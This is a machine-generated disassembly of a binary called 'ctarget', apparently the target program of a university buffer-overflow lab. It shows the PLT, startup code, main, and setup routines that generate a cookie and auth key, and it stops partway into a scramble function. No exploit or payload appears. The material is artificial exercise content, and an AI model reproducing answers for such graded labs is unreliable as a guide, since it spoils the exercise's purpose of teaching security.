
ctarget:     file format elf64-x86-64


Disassembly of section .init:

0000000000400c48 <_init>:
  400c48:	48 83 ec 08          	sub    $0x8,%rsp
  400c4c:	48 8b 05 a5 33 20 00 	mov    0x2033a5(%rip),%rax        # 603ff8 <__gmon_start__>
  400c53:	48 85 c0             	test   %rax,%rax
  400c56:	74 02                	je     400c5a <_init+0x12>
  400c58:	ff d0                	callq  *%rax
  400c5a:	48 83 c4 08          	add    $0x8,%rsp
  400c5e:	c3                   	retq   

Disassembly of section .plt:

0000000000400c60 <.plt>:
  400c60:	ff 35 a2 33 20 00    	pushq  0x2033a2(%rip)        # 604008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400c66:	ff 25 a4 33 20 00    	jmpq   *0x2033a4(%rip)        # 604010 <_GLOBAL_OFFSET_TABLE_+0x10>
  400c6c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400c70 <strcasecmp@plt>:
  400c70:	ff 25 a2 33 20 00    	jmpq   *0x2033a2(%rip)        # 604018 <strcasecmp@GLIBC_2.2.5>
  400c76:	68 00 00 00 00       	pushq  $0x0
  400c7b:	e9 e0 ff ff ff       	jmpq   400c60 <.plt>

0000000000400c80 <__errno_location@plt>:
  400c80:	ff 25 9a 33 20 00    	jmpq   *0x20339a(%rip)        # 604020 <__errno_location@GLIBC_2.2.5>
  400c86:	68 01 00 00 00       	pushq  $0x1
  400c8b:	e9 d0 ff ff ff       	jmpq   400c60 <.plt>

0000000000400c90 <srandom@plt>:
  400c90:	ff 25 92 33 20 00    	jmpq   *0x203392(%rip)        # 604028 <srandom@GLIBC_2.2.5>
  400c96:	68 02 00 00 00       	pushq  $0x2
  400c9b:	e9 c0 ff ff ff       	jmpq   400c60 <.plt>

0000000000400ca0 <strncmp@plt>:
  400ca0:	ff 25 8a 33 20 00    	jmpq   *0x20338a(%rip)        # 604030 <strncmp@GLIBC_2.2.5>
  400ca6:	68 03 00 00 00       	pushq  $0x3
  400cab:	e9 b0 ff ff ff       	jmpq   400c60 <.plt>

0000000000400cb0 <strcpy@plt>:
  400cb0:	ff 25 82 33 20 00    	jmpq   *0x203382(%rip)        # 604038 <strcpy@GLIBC_2.2.5>
  400cb6:	68 04 00 00 00       	pushq  $0x4
  400cbb:	e9 a0 ff ff ff       	jmpq   400c60 <.plt>

0000000000400cc0 <puts@plt>:
  400cc0:	ff 25 7a 33 20 00    	jmpq   *0x20337a(%rip)        # 604040 <puts@GLIBC_2.2.5>
  400cc6:	68 05 00 00 00       	pushq  $0x5
  400ccb:	e9 90 ff ff ff       	jmpq   400c60 <.plt>

0000000000400cd0 <write@plt>:
  400cd0:	ff 25 72 33 20 00    	jmpq   *0x203372(%rip)        # 604048 <write@GLIBC_2.2.5>
  400cd6:	68 06 00 00 00       	pushq  $0x6
  400cdb:	e9 80 ff ff ff       	jmpq   400c60 <.plt>

0000000000400ce0 <__stack_chk_fail@plt>:
  400ce0:	ff 25 6a 33 20 00    	jmpq   *0x20336a(%rip)        # 604050 <__stack_chk_fail@GLIBC_2.4>
  400ce6:	68 07 00 00 00       	pushq  $0x7
  400ceb:	e9 70 ff ff ff       	jmpq   400c60 <.plt>

0000000000400cf0 <mmap@plt>:
  400cf0:	ff 25 62 33 20 00    	jmpq   *0x203362(%rip)        # 604058 <mmap@GLIBC_2.2.5>
  400cf6:	68 08 00 00 00       	pushq  $0x8
  400cfb:	e9 60 ff ff ff       	jmpq   400c60 <.plt>

0000000000400d00 <memset@plt>:
  400d00:	ff 25 5a 33 20 00    	jmpq   *0x20335a(%rip)        # 604060 <memset@GLIBC_2.2.5>
  400d06:	68 09 00 00 00       	pushq  $0x9
  400d0b:	e9 50 ff ff ff       	jmpq   400c60 <.plt>

0000000000400d10 <alarm@plt>:
  400d10:	ff 25 52 33 20 00    	jmpq   *0x203352(%rip)        # 604068 <alarm@GLIBC_2.2.5>
  400d16:	68 0a 00 00 00       	pushq  $0xa
  400d1b:	e9 40 ff ff ff       	jmpq   400c60 <.plt>

0000000000400d20 <close@plt>:
  400d20:	ff 25 4a 33 20 00    	jmpq   *0x20334a(%rip)        # 604070 <close@GLIBC_2.2.5>
  400d26:	68 0b 00 00 00       	pushq  $0xb
  400d2b:	e9 30 ff ff ff       	jmpq   400c60 <.plt>

0000000000400d30 <read@plt>:
  400d30:	ff 25 42 33 20 00    	jmpq   *0x203342(%rip)        # 604078 <read@GLIBC_2.2.5>
  400d36:	68 0c 00 00 00       	pushq  $0xc
  400d3b:	e9 20 ff ff ff       	jmpq   400c60 <.plt>

0000000000400d40 <signal@plt>:
  400d40:	ff 25 3a 33 20 00    	jmpq   *0x20333a(%rip)        # 604080 <signal@GLIBC_2.2.5>
  400d46:	68 0d 00 00 00       	pushq  $0xd
  400d4b:	e9 10 ff ff ff       	jmpq   400c60 <.plt>

0000000000400d50 <gethostbyname@plt>:
  400d50:	ff 25 32 33 20 00    	jmpq   *0x203332(%rip)        # 604088 <gethostbyname@GLIBC_2.2.5>
  400d56:	68 0e 00 00 00       	pushq  $0xe
  400d5b:	e9 00 ff ff ff       	jmpq   400c60 <.plt>

0000000000400d60 <__memmove_chk@plt>:
  400d60:	ff 25 2a 33 20 00    	jmpq   *0x20332a(%rip)        # 604090 <__memmove_chk@GLIBC_2.3.4>
  400d66:	68 0f 00 00 00       	pushq  $0xf
  400d6b:	e9 f0 fe ff ff       	jmpq   400c60 <.plt>

0000000000400d70 <strtol@plt>:
  400d70:	ff 25 22 33 20 00    	jmpq   *0x203322(%rip)        # 604098 <strtol@GLIBC_2.2.5>
  400d76:	68 10 00 00 00       	pushq  $0x10
  400d7b:	e9 e0 fe ff ff       	jmpq   400c60 <.plt>

0000000000400d80 <memcpy@plt>:
  400d80:	ff 25 1a 33 20 00    	jmpq   *0x20331a(%rip)        # 6040a0 <memcpy@GLIBC_2.14>
  400d86:	68 11 00 00 00       	pushq  $0x11
  400d8b:	e9 d0 fe ff ff       	jmpq   400c60 <.plt>

0000000000400d90 <time@plt>:
  400d90:	ff 25 12 33 20 00    	jmpq   *0x203312(%rip)        # 6040a8 <time@GLIBC_2.2.5>
  400d96:	68 12 00 00 00       	pushq  $0x12
  400d9b:	e9 c0 fe ff ff       	jmpq   400c60 <.plt>

0000000000400da0 <random@plt>:
  400da0:	ff 25 0a 33 20 00    	jmpq   *0x20330a(%rip)        # 6040b0 <random@GLIBC_2.2.5>
  400da6:	68 13 00 00 00       	pushq  $0x13
  400dab:	e9 b0 fe ff ff       	jmpq   400c60 <.plt>

0000000000400db0 <_IO_getc@plt>:
  400db0:	ff 25 02 33 20 00    	jmpq   *0x203302(%rip)        # 6040b8 <_IO_getc@GLIBC_2.2.5>
  400db6:	68 14 00 00 00       	pushq  $0x14
  400dbb:	e9 a0 fe ff ff       	jmpq   400c60 <.plt>

0000000000400dc0 <__isoc99_sscanf@plt>:
  400dc0:	ff 25 fa 32 20 00    	jmpq   *0x2032fa(%rip)        # 6040c0 <__isoc99_sscanf@GLIBC_2.7>
  400dc6:	68 15 00 00 00       	pushq  $0x15
  400dcb:	e9 90 fe ff ff       	jmpq   400c60 <.plt>

0000000000400dd0 <munmap@plt>:
  400dd0:	ff 25 f2 32 20 00    	jmpq   *0x2032f2(%rip)        # 6040c8 <munmap@GLIBC_2.2.5>
  400dd6:	68 16 00 00 00       	pushq  $0x16
  400ddb:	e9 80 fe ff ff       	jmpq   400c60 <.plt>

0000000000400de0 <__printf_chk@plt>:
  400de0:	ff 25 ea 32 20 00    	jmpq   *0x2032ea(%rip)        # 6040d0 <__printf_chk@GLIBC_2.3.4>
  400de6:	68 17 00 00 00       	pushq  $0x17
  400deb:	e9 70 fe ff ff       	jmpq   400c60 <.plt>

0000000000400df0 <fopen@plt>:
  400df0:	ff 25 e2 32 20 00    	jmpq   *0x2032e2(%rip)        # 6040d8 <fopen@GLIBC_2.2.5>
  400df6:	68 18 00 00 00       	pushq  $0x18
  400dfb:	e9 60 fe ff ff       	jmpq   400c60 <.plt>

0000000000400e00 <getopt@plt>:
  400e00:	ff 25 da 32 20 00    	jmpq   *0x2032da(%rip)        # 6040e0 <getopt@GLIBC_2.2.5>
  400e06:	68 19 00 00 00       	pushq  $0x19
  400e0b:	e9 50 fe ff ff       	jmpq   400c60 <.plt>

0000000000400e10 <strtoul@plt>:
  400e10:	ff 25 d2 32 20 00    	jmpq   *0x2032d2(%rip)        # 6040e8 <strtoul@GLIBC_2.2.5>
  400e16:	68 1a 00 00 00       	pushq  $0x1a
  400e1b:	e9 40 fe ff ff       	jmpq   400c60 <.plt>

0000000000400e20 <gethostname@plt>:
  400e20:	ff 25 ca 32 20 00    	jmpq   *0x2032ca(%rip)        # 6040f0 <gethostname@GLIBC_2.2.5>
  400e26:	68 1b 00 00 00       	pushq  $0x1b
  400e2b:	e9 30 fe ff ff       	jmpq   400c60 <.plt>

0000000000400e30 <exit@plt>:
  400e30:	ff 25 c2 32 20 00    	jmpq   *0x2032c2(%rip)        # 6040f8 <exit@GLIBC_2.2.5>
  400e36:	68 1c 00 00 00       	pushq  $0x1c
  400e3b:	e9 20 fe ff ff       	jmpq   400c60 <.plt>

0000000000400e40 <connect@plt>:
  400e40:	ff 25 ba 32 20 00    	jmpq   *0x2032ba(%rip)        # 604100 <connect@GLIBC_2.2.5>
  400e46:	68 1d 00 00 00       	pushq  $0x1d
  400e4b:	e9 10 fe ff ff       	jmpq   400c60 <.plt>

0000000000400e50 <__fprintf_chk@plt>:
  400e50:	ff 25 b2 32 20 00    	jmpq   *0x2032b2(%rip)        # 604108 <__fprintf_chk@GLIBC_2.3.4>
  400e56:	68 1e 00 00 00       	pushq  $0x1e
  400e5b:	e9 00 fe ff ff       	jmpq   400c60 <.plt>

0000000000400e60 <__sprintf_chk@plt>:
  400e60:	ff 25 aa 32 20 00    	jmpq   *0x2032aa(%rip)        # 604110 <__sprintf_chk@GLIBC_2.3.4>
  400e66:	68 1f 00 00 00       	pushq  $0x1f
  400e6b:	e9 f0 fd ff ff       	jmpq   400c60 <.plt>

0000000000400e70 <socket@plt>:
  400e70:	ff 25 a2 32 20 00    	jmpq   *0x2032a2(%rip)        # 604118 <socket@GLIBC_2.2.5>
  400e76:	68 20 00 00 00       	pushq  $0x20
  400e7b:	e9 e0 fd ff ff       	jmpq   400c60 <.plt>

Disassembly of section .text:

0000000000400e80 <_start>:
  400e80:	31 ed                	xor    %ebp,%ebp
  400e82:	49 89 d1             	mov    %rdx,%r9
  400e85:	5e                   	pop    %rsi
  400e86:	48 89 e2             	mov    %rsp,%rdx
  400e89:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  400e8d:	50                   	push   %rax
  400e8e:	54                   	push   %rsp
  400e8f:	49 c7 c0 c0 2e 40 00 	mov    $0x402ec0,%r8
  400e96:	48 c7 c1 50 2e 40 00 	mov    $0x402e50,%rcx
  400e9d:	48 c7 c7 73 11 40 00 	mov    $0x401173,%rdi
  400ea4:	ff 15 46 31 20 00    	callq  *0x203146(%rip)        # 603ff0 <__libc_start_main@GLIBC_2.2.5>
  400eaa:	f4                   	hlt    
  400eab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000400eb0 <_dl_relocate_static_pie>:
  400eb0:	f3 c3                	repz retq 
  400eb2:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400eb9:	00 00 00 
  400ebc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400ec0 <deregister_tm_clones>:
  400ec0:	55                   	push   %rbp
  400ec1:	b8 90 44 60 00       	mov    $0x604490,%eax
  400ec6:	48 3d 90 44 60 00    	cmp    $0x604490,%rax
  400ecc:	48 89 e5             	mov    %rsp,%rbp
  400ecf:	74 17                	je     400ee8 <deregister_tm_clones+0x28>
  400ed1:	b8 00 00 00 00       	mov    $0x0,%eax
  400ed6:	48 85 c0             	test   %rax,%rax
  400ed9:	74 0d                	je     400ee8 <deregister_tm_clones+0x28>
  400edb:	5d                   	pop    %rbp
  400edc:	bf 90 44 60 00       	mov    $0x604490,%edi
  400ee1:	ff e0                	jmpq   *%rax
  400ee3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  400ee8:	5d                   	pop    %rbp
  400ee9:	c3                   	retq   
  400eea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400ef0 <register_tm_clones>:
  400ef0:	be 90 44 60 00       	mov    $0x604490,%esi
  400ef5:	55                   	push   %rbp
  400ef6:	48 81 ee 90 44 60 00 	sub    $0x604490,%rsi
  400efd:	48 89 e5             	mov    %rsp,%rbp
  400f00:	48 c1 fe 03          	sar    $0x3,%rsi
  400f04:	48 89 f0             	mov    %rsi,%rax
  400f07:	48 c1 e8 3f          	shr    $0x3f,%rax
  400f0b:	48 01 c6             	add    %rax,%rsi
  400f0e:	48 d1 fe             	sar    %rsi
  400f11:	74 15                	je     400f28 <register_tm_clones+0x38>
  400f13:	b8 00 00 00 00       	mov    $0x0,%eax
  400f18:	48 85 c0             	test   %rax,%rax
  400f1b:	74 0b                	je     400f28 <register_tm_clones+0x38>
  400f1d:	5d                   	pop    %rbp
  400f1e:	bf 90 44 60 00       	mov    $0x604490,%edi
  400f23:	ff e0                	jmpq   *%rax
  400f25:	0f 1f 00             	nopl   (%rax)
  400f28:	5d                   	pop    %rbp
  400f29:	c3                   	retq   
  400f2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400f30 <__do_global_dtors_aux>:
  400f30:	80 3d 91 35 20 00 00 	cmpb   $0x0,0x203591(%rip)        # 6044c8 <completed.7697>
  400f37:	75 17                	jne    400f50 <__do_global_dtors_aux+0x20>
  400f39:	55                   	push   %rbp
  400f3a:	48 89 e5             	mov    %rsp,%rbp
  400f3d:	e8 7e ff ff ff       	callq  400ec0 <deregister_tm_clones>
  400f42:	c6 05 7f 35 20 00 01 	movb   $0x1,0x20357f(%rip)        # 6044c8 <completed.7697>
  400f49:	5d                   	pop    %rbp
  400f4a:	c3                   	retq   
  400f4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  400f50:	f3 c3                	repz retq 
  400f52:	0f 1f 40 00          	nopl   0x0(%rax)
  400f56:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400f5d:	00 00 00 

0000000000400f60 <frame_dummy>:
  400f60:	55                   	push   %rbp
  400f61:	48 89 e5             	mov    %rsp,%rbp
  400f64:	5d                   	pop    %rbp
  400f65:	eb 89                	jmp    400ef0 <register_tm_clones>

0000000000400f67 <usage>:
  400f67:	48 83 ec 08          	sub    $0x8,%rsp
  400f6b:	48 89 fa             	mov    %rdi,%rdx
  400f6e:	83 3d 93 35 20 00 00 	cmpl   $0x0,0x203593(%rip)        # 604508 <is_checker>
  400f75:	74 46                	je     400fbd <usage+0x56>
  400f77:	be d8 2e 40 00       	mov    $0x402ed8,%esi
  400f7c:	bf 01 00 00 00       	mov    $0x1,%edi
  400f81:	b8 00 00 00 00       	mov    $0x0,%eax
  400f86:	e8 55 fe ff ff       	callq  400de0 <__printf_chk@plt>
  400f8b:	bf 10 2f 40 00       	mov    $0x402f10,%edi
  400f90:	e8 2b fd ff ff       	callq  400cc0 <puts@plt>
  400f95:	bf 88 30 40 00       	mov    $0x403088,%edi
  400f9a:	e8 21 fd ff ff       	callq  400cc0 <puts@plt>
  400f9f:	bf 38 2f 40 00       	mov    $0x402f38,%edi
  400fa4:	e8 17 fd ff ff       	callq  400cc0 <puts@plt>
  400fa9:	bf a2 30 40 00       	mov    $0x4030a2,%edi
  400fae:	e8 0d fd ff ff       	callq  400cc0 <puts@plt>
  400fb3:	bf 00 00 00 00       	mov    $0x0,%edi
  400fb8:	e8 73 fe ff ff       	callq  400e30 <exit@plt>
  400fbd:	be be 30 40 00       	mov    $0x4030be,%esi
  400fc2:	bf 01 00 00 00       	mov    $0x1,%edi
  400fc7:	b8 00 00 00 00       	mov    $0x0,%eax
  400fcc:	e8 0f fe ff ff       	callq  400de0 <__printf_chk@plt>
  400fd1:	bf 60 2f 40 00       	mov    $0x402f60,%edi
  400fd6:	e8 e5 fc ff ff       	callq  400cc0 <puts@plt>
  400fdb:	bf 88 2f 40 00       	mov    $0x402f88,%edi
  400fe0:	e8 db fc ff ff       	callq  400cc0 <puts@plt>
  400fe5:	bf dc 30 40 00       	mov    $0x4030dc,%edi
  400fea:	e8 d1 fc ff ff       	callq  400cc0 <puts@plt>
  400fef:	eb c2                	jmp    400fb3 <usage+0x4c>

0000000000400ff1 <initialize_target>:
  400ff1:	55                   	push   %rbp
  400ff2:	53                   	push   %rbx
  400ff3:	48 81 ec 18 21 00 00 	sub    $0x2118,%rsp
  400ffa:	89 f5                	mov    %esi,%ebp
  400ffc:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401003:	00 00 
  401005:	48 89 84 24 08 21 00 	mov    %rax,0x2108(%rsp)
  40100c:	00 
  40100d:	31 c0                	xor    %eax,%eax
  40100f:	89 3d e3 34 20 00    	mov    %edi,0x2034e3(%rip)        # 6044f8 <check_level>
  401015:	8b 3d 2d 31 20 00    	mov    0x20312d(%rip),%edi        # 604148 <target_id>
  40101b:	e8 09 1e 00 00       	callq  402e29 <gencookie>
  401020:	89 05 de 34 20 00    	mov    %eax,0x2034de(%rip)        # 604504 <cookie>
  401026:	89 c7                	mov    %eax,%edi
  401028:	e8 fc 1d 00 00       	callq  402e29 <gencookie>
  40102d:	89 05 cd 34 20 00    	mov    %eax,0x2034cd(%rip)        # 604500 <authkey>
  401033:	8b 05 0f 31 20 00    	mov    0x20310f(%rip),%eax        # 604148 <target_id>
  401039:	8d 78 01             	lea    0x1(%rax),%edi
  40103c:	e8 4f fc ff ff       	callq  400c90 <srandom@plt>
  401041:	e8 5a fd ff ff       	callq  400da0 <random@plt>
  401046:	89 c7                	mov    %eax,%edi
  401048:	e8 f2 02 00 00       	callq  40133f <scramble>
  40104d:	89 c3                	mov    %eax,%ebx
  40104f:	85 ed                	test   %ebp,%ebp
  401051:	75 54                	jne    4010a7 <initialize_target+0xb6>
  401053:	b8 00 00 00 00       	mov    $0x0,%eax
  401058:	01 d8                	add    %ebx,%eax
  40105a:	0f b7 c0             	movzwl %ax,%eax
  40105d:	8d 04 c5 00 01 00 00 	lea    0x100(,%rax,8),%eax
  401064:	89 c0                	mov    %eax,%eax
  401066:	48 89 05 13 34 20 00 	mov    %rax,0x203413(%rip)        # 604480 <buf_offset>
  40106d:	c6 05 b4 40 20 00 63 	movb   $0x63,0x2040b4(%rip)        # 605128 <target_prefix>
  401074:	83 3d 0d 34 20 00 00 	cmpl   $0x0,0x20340d(%rip)        # 604488 <notify>
  40107b:	74 09                	je     401086 <initialize_target+0x95>
  40107d:	83 3d 84 34 20 00 00 	cmpl   $0x0,0x203484(%rip)        # 604508 <is_checker>
  401084:	74 39                	je     4010bf <initialize_target+0xce>
  401086:	48 8b 84 24 08 21 00 	mov    0x2108(%rsp),%rax
  40108d:	00 
  40108e:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  401095:	00 00 
  401097:	0f 85 d1 00 00 00    	jne    40116e <initialize_target+0x17d>
  40109d:	48 81 c4 18 21 00 00 	add    $0x2118,%rsp
  4010a4:	5b                   	pop    %rbx
  4010a5:	5d                   	pop    %rbp
  4010a6:	c3                   	retq   
  4010a7:	bf 00 00 00 00       	mov    $0x0,%edi
  4010ac:	e8 df fc ff ff       	callq  400d90 <time@plt>
  4010b1:	89 c7                	mov    %eax,%edi
  4010b3:	e8 d8 fb ff ff       	callq  400c90 <srandom@plt>
  4010b8:	e8 e3 fc ff ff       	callq  400da0 <random@plt>
  4010bd:	eb 99                	jmp    401058 <initialize_target+0x67>
  4010bf:	be 00 01 00 00       	mov    $0x100,%esi
  4010c4:	48 89 e7             	mov    %rsp,%rdi
  4010c7:	e8 54 fd ff ff       	callq  400e20 <gethostname@plt>
  4010cc:	89 c5                	mov    %eax,%ebp
  4010ce:	85 c0                	test   %eax,%eax
  4010d0:	75 23                	jne    4010f5 <initialize_target+0x104>
  4010d2:	89 c3                	mov    %eax,%ebx
  4010d4:	48 63 c3             	movslq %ebx,%rax
  4010d7:	48 8b 3c c5 60 41 60 	mov    0x604160(,%rax,8),%rdi
  4010de:	00 
  4010df:	48 85 ff             	test   %rdi,%rdi
  4010e2:	74 2a                	je     40110e <initialize_target+0x11d>
  4010e4:	48 89 e6             	mov    %rsp,%rsi
  4010e7:	e8 84 fb ff ff       	callq  400c70 <strcasecmp@plt>
  4010ec:	85 c0                	test   %eax,%eax
  4010ee:	74 19                	je     401109 <initialize_target+0x118>
  4010f0:	83 c3 01             	add    $0x1,%ebx
  4010f3:	eb df                	jmp    4010d4 <initialize_target+0xe3>
  4010f5:	bf b8 2f 40 00       	mov    $0x402fb8,%edi
  4010fa:	e8 c1 fb ff ff       	callq  400cc0 <puts@plt>
  4010ff:	bf 08 00 00 00       	mov    $0x8,%edi
  401104:	e8 27 fd ff ff       	callq  400e30 <exit@plt>
  401109:	bd 01 00 00 00       	mov    $0x1,%ebp
  40110e:	85 ed                	test   %ebp,%ebp
  401110:	74 3b                	je     40114d <initialize_target+0x15c>
  401112:	48 8d bc 24 00 01 00 	lea    0x100(%rsp),%rdi
  401119:	00 
  40111a:	e8 5f 1a 00 00       	callq  402b7e <init_driver>
  40111f:	85 c0                	test   %eax,%eax
  401121:	0f 89 5f ff ff ff    	jns    401086 <initialize_target+0x95>
  401127:	48 8d 94 24 00 01 00 	lea    0x100(%rsp),%rdx
  40112e:	00 
  40112f:	be 30 30 40 00       	mov    $0x403030,%esi
  401134:	bf 01 00 00 00       	mov    $0x1,%edi
  401139:	b8 00 00 00 00       	mov    $0x0,%eax
  40113e:	e8 9d fc ff ff       	callq  400de0 <__printf_chk@plt>
  401143:	bf 08 00 00 00       	mov    $0x8,%edi
  401148:	e8 e3 fc ff ff       	callq  400e30 <exit@plt>
  40114d:	48 89 e2             	mov    %rsp,%rdx
  401150:	be f0 2f 40 00       	mov    $0x402ff0,%esi
  401155:	bf 01 00 00 00       	mov    $0x1,%edi
  40115a:	b8 00 00 00 00       	mov    $0x0,%eax
  40115f:	e8 7c fc ff ff       	callq  400de0 <__printf_chk@plt>
  401164:	bf 08 00 00 00       	mov    $0x8,%edi
  401169:	e8 c2 fc ff ff       	callq  400e30 <exit@plt>
  40116e:	e8 6d fb ff ff       	callq  400ce0 <__stack_chk_fail@plt>

0000000000401173 <main>:
  401173:	41 56                	push   %r14
  401175:	41 55                	push   %r13
  401177:	41 54                	push   %r12
  401179:	55                   	push   %rbp
  40117a:	53                   	push   %rbx
  40117b:	41 89 fc             	mov    %edi,%r12d
  40117e:	48 89 f3             	mov    %rsi,%rbx
  401181:	be bb 1e 40 00       	mov    $0x401ebb,%esi
  401186:	bf 0b 00 00 00       	mov    $0xb,%edi
  40118b:	e8 b0 fb ff ff       	callq  400d40 <signal@plt>
  401190:	be 6d 1e 40 00       	mov    $0x401e6d,%esi
  401195:	bf 07 00 00 00       	mov    $0x7,%edi
  40119a:	e8 a1 fb ff ff       	callq  400d40 <signal@plt>
  40119f:	be 09 1f 40 00       	mov    $0x401f09,%esi
  4011a4:	bf 04 00 00 00       	mov    $0x4,%edi
  4011a9:	e8 92 fb ff ff       	callq  400d40 <signal@plt>
  4011ae:	83 3d 53 33 20 00 00 	cmpl   $0x0,0x203353(%rip)        # 604508 <is_checker>
  4011b5:	75 24                	jne    4011db <main+0x68>
  4011b7:	bd f5 30 40 00       	mov    $0x4030f5,%ebp
  4011bc:	48 8b 05 dd 32 20 00 	mov    0x2032dd(%rip),%rax        # 6044a0 <stdin@@GLIBC_2.2.5>
  4011c3:	48 89 05 26 33 20 00 	mov    %rax,0x203326(%rip)        # 6044f0 <infile>
  4011ca:	41 bd 00 00 00 00    	mov    $0x0,%r13d
  4011d0:	41 be 00 00 00 00    	mov    $0x0,%r14d
  4011d6:	e9 85 00 00 00       	jmpq   401260 <main+0xed>
  4011db:	be 57 1f 40 00       	mov    $0x401f57,%esi
  4011e0:	bf 0e 00 00 00       	mov    $0xe,%edi
  4011e5:	e8 56 fb ff ff       	callq  400d40 <signal@plt>
  4011ea:	bf 05 00 00 00       	mov    $0x5,%edi
  4011ef:	e8 1c fb ff ff       	callq  400d10 <alarm@plt>
  4011f4:	bd fa 30 40 00       	mov    $0x4030fa,%ebp
  4011f9:	eb c1                	jmp    4011bc <main+0x49>
  4011fb:	48 8b 3b             	mov    (%rbx),%rdi
  4011fe:	e8 64 fd ff ff       	callq  400f67 <usage>
  401203:	be a5 33 40 00       	mov    $0x4033a5,%esi
  401208:	48 8b 3d 99 32 20 00 	mov    0x203299(%rip),%rdi        # 6044a8 <optarg@@GLIBC_2.2.5>
  40120f:	e8 dc fb ff ff       	callq  400df0 <fopen@plt>
  401214:	48 89 05 d5 32 20 00 	mov    %rax,0x2032d5(%rip)        # 6044f0 <infile>
  40121b:	48 85 c0             	test   %rax,%rax
  40121e:	75 40                	jne    401260 <main+0xed>
  401220:	48 8b 0d 81 32 20 00 	mov    0x203281(%rip),%rcx        # 6044a8 <optarg@@GLIBC_2.2.5>
  401227:	ba 02 31 40 00       	mov    $0x403102,%edx
  40122c:	be 01 00 00 00       	mov    $0x1,%esi
  401231:	48 8b 3d 88 32 20 00 	mov    0x203288(%rip),%rdi        # 6044c0 <stderr@@GLIBC_2.2.5>
  401238:	e8 13 fc ff ff       	callq  400e50 <__fprintf_chk@plt>
  40123d:	b8 01 00 00 00       	mov    $0x1,%eax
  401242:	e9 cc 00 00 00       	jmpq   401313 <main+0x1a0>
  401247:	ba 10 00 00 00       	mov    $0x10,%edx
  40124c:	be 00 00 00 00       	mov    $0x0,%esi
  401251:	48 8b 3d 50 32 20 00 	mov    0x203250(%rip),%rdi        # 6044a8 <optarg@@GLIBC_2.2.5>
  401258:	e8 b3 fb ff ff       	callq  400e10 <strtoul@plt>
  40125d:	41 89 c6             	mov    %eax,%r14d
  401260:	48 89 ea             	mov    %rbp,%rdx
  401263:	48 89 de             	mov    %rbx,%rsi
  401266:	44 89 e7             	mov    %r12d,%edi
  401269:	e8 92 fb ff ff       	callq  400e00 <getopt@plt>
  40126e:	3c ff                	cmp    $0xff,%al
  401270:	74 57                	je     4012c9 <main+0x156>
  401272:	0f be d0             	movsbl %al,%edx
  401275:	83 e8 61             	sub    $0x61,%eax
  401278:	3c 10                	cmp    $0x10,%al
  40127a:	77 31                	ja     4012ad <main+0x13a>
  40127c:	0f b6 c0             	movzbl %al,%eax
  40127f:	ff 24 c5 40 31 40 00 	jmpq   *0x403140(,%rax,8)
  401286:	ba 0a 00 00 00       	mov    $0xa,%edx
  40128b:	be 00 00 00 00       	mov    $0x0,%esi
  401290:	48 8b 3d 11 32 20 00 	mov    0x203211(%rip),%rdi        # 6044a8 <optarg@@GLIBC_2.2.5>
  401297:	e8 d4 fa ff ff       	callq  400d70 <strtol@plt>
  40129c:	41 89 c5             	mov    %eax,%r13d
  40129f:	eb bf                	jmp    401260 <main+0xed>
  4012a1:	c7 05 dd 31 20 00 00 	movl   $0x0,0x2031dd(%rip)        # 604488 <notify>
  4012a8:	00 00 00 
  4012ab:	eb b3                	jmp    401260 <main+0xed>
  4012ad:	be 1f 31 40 00       	mov    $0x40311f,%esi
  4012b2:	bf 01 00 00 00       	mov    $0x1,%edi
  4012b7:	b8 00 00 00 00       	mov    $0x0,%eax
  4012bc:	e8 1f fb ff ff       	callq  400de0 <__printf_chk@plt>
  4012c1:	48 8b 3b             	mov    (%rbx),%rdi
  4012c4:	e8 9e fc ff ff       	callq  400f67 <usage>
  4012c9:	be 00 00 00 00       	mov    $0x0,%esi
  4012ce:	44 89 ef             	mov    %r13d,%edi
  4012d1:	e8 1b fd ff ff       	callq  400ff1 <initialize_target>
  4012d6:	83 3d 2b 32 20 00 00 	cmpl   $0x0,0x20322b(%rip)        # 604508 <is_checker>
  4012dd:	74 09                	je     4012e8 <main+0x175>
  4012df:	44 39 35 1a 32 20 00 	cmp    %r14d,0x20321a(%rip)        # 604500 <authkey>
  4012e6:	75 34                	jne    40131c <main+0x1a9>
  4012e8:	8b 15 16 32 20 00    	mov    0x203216(%rip),%edx        # 604504 <cookie>
  4012ee:	be 32 31 40 00       	mov    $0x403132,%esi
  4012f3:	bf 01 00 00 00       	mov    $0x1,%edi
  4012f8:	b8 00 00 00 00       	mov    $0x0,%eax
  4012fd:	e8 de fa ff ff       	callq  400de0 <__printf_chk@plt>
  401302:	48 8b 3d 77 31 20 00 	mov    0x203177(%rip),%rdi        # 604480 <buf_offset>
  401309:	e8 4b 0d 00 00       	callq  402059 <stable_launch>
  40130e:	b8 00 00 00 00       	mov    $0x0,%eax
  401313:	5b                   	pop    %rbx
  401314:	5d                   	pop    %rbp
  401315:	41 5c                	pop    %r12
  401317:	41 5d                	pop    %r13
  401319:	41 5e                	pop    %r14
  40131b:	c3                   	retq   
  40131c:	44 89 f2             	mov    %r14d,%edx
  40131f:	be 58 30 40 00       	mov    $0x403058,%esi
  401324:	bf 01 00 00 00       	mov    $0x1,%edi
  401329:	b8 00 00 00 00       	mov    $0x0,%eax
  40132e:	e8 ad fa ff ff       	callq  400de0 <__printf_chk@plt>
  401333:	b8 00 00 00 00       	mov    $0x0,%eax
  401338:	e8 b9 07 00 00       	callq  401af6 <check_fail>
  40133d:	eb a9                	jmp    4012e8 <main+0x175>

000000000040133f <scramble>:
  40133f:	48 83 ec 38          	sub    $0x38,%rsp
  401343:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40134a:	00 00 
  40134c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401351:	31 c0                	xor    %eax,%eax
  401353:	eb 10                	jmp    401365 <scramble+0x26>
